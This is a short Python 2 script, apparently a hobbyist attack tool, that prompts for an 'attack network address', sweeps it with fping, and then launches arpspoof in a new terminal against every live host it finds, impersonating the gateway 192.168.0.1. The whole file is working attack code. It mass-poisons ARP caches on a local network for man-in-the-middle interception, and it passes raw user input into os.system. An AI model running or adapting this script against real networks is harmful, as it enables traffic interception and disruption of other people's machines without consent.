#import commands
import os
import re
print("################################")
print("#\n#\n    By:Zhuyingjie \n#\n#")
print("################################")
IP =  raw_input("Please enter the attack network address(like 192.168.0.1/24):")
IP = str(IP)
att1 = 'fping -ags '
att2 = ' > ip.txt'
IP = att1 + IP + att2
print("Construct command:"+ IP)                                                 #拼接指令
print("\n Scanning.........")
os.system(IP)                                                                   #执行命令，将结构保存到txt
list = []                                                                       #空列表，用于存放扫描到的IP
n = 0
cmd1 = "gnome-terminal -e \'arpspoof -i eth0 -t "
cmd2 = " 192.168.0.1\'"
f = open('ip.txt','r')                                        
if(f !=0):
	print('open file success!')
	print('output:')
	for echo in f:
		list.append(echo)                                                       #扫描结构读入到列表
		CMD = cmd1 + str(list[n]) + cmd2                                        #拼接指令
		n = n+1
		print ("The spoofed IP address is" + CMD)
		os.system(CMD)                                                          #执行攻击程序
	f.close()
else:
	print('erro!!') 

